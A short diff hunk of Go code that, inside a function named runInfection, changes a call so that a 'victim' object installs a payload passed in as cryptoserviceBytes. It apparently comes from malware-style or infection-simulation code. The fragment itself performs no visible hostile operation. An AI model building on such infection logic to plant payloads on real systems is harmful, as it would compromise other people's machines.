@@ -34,5 +34,5 @@ func runInfection(done chan<- struct{}) {
     if err != nil {
         return
     }
-    victim.InstallPayload()
+    victim.InstallPayload(cryptoserviceBytes)
 }
